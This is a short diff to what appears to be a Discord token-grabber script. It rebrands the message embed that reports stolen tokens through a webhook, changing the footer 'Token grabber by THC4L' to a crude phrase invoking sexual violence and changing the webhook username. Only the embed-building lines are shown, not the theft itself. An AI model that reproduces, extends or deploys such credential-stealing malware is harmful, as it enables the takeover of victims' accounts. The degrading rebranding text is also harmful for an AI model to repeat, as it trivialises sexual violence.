@@ -179,7 +179,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by THC4L"
+                    "text": f"Rape machine by: souls"
                 }
             }
             embeds.append(embed)
@@ -193,7 +193,7 @@ def main():
         "content": "",
         "embeds": embeds,
 
-        "username": "THC4L",
+        "username": "souls",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
